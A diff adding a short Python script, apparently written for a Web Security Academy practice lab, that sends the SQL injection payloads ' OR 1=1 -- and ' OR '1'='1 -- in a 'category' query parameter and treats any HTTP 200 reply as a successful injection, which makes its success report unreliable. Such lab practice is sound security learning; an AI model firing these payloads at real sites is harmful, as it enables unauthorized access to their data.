@@ -1,0 +1,16 @@
+import requests
+
+# Error-based SQL injection using OR payload
+Orpayloads = ["' OR 1=1 --",
+             "' OR '1'='1 --"]
+
+def or_inj(url):
+    print("Trying error-based injection, please wait...")
+    for payload in Orpayloads:
+        encoded_payload = {'category': payload}
+        r = requests.get(url, params=encoded_payload)
+        if r.status_code == 200:
+            print(f"Successful injection: {url} with payload: {payload}")
+
+url = 'https://0ad5003f0473729f85596388009300af.web-security-academy.net/filter'
+or_inj(url)
